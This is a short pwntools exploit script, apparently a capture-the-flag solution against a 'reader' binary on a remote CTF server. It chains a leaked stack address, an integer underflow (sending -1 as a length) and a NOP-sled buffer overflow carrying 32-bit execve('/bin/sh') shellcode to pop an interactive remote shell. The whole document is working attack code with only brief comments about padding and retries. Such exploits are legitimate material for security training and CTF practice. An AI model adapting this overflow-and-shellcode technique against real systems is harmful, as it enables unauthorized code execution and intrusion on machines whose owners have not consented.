from pwn import *
import time

p = process('./dist/reader')
e = p.elf
p = remote('cbactf.com', 5003)

p.recvuntil(b'? ')
address = int(p.recvline().strip(), 16)

shellcode = asm("""
call pwn
    pwn:
    pop ebx
    diff = binsh - pwn
    add ebx, diff

    mov eax, 0xb
    xor ecx, ecx
    xor edx, edx
    xor esi, esi

    int 0x80

    binsh: .string "/bin/sh"
""")

# very similar to shellz in the wargames, in that you can overwrite your own payload if you push
# so either pad at the end, or use a different payload with no push's
# if the payload is over a certain length (29) you might get unlucky, just run the payload again lol

payload = b'\x90' * (0x8C - len(shellcode))
payload += shellcode
payload += p32(address)

# integer underflow to get arbitrary write length
p.sendlineafter(b'$ ', b'-1')

# jump back into the buffer and execute shellcode
p.sendlineafter(b'$ ', payload)

p.interactive()
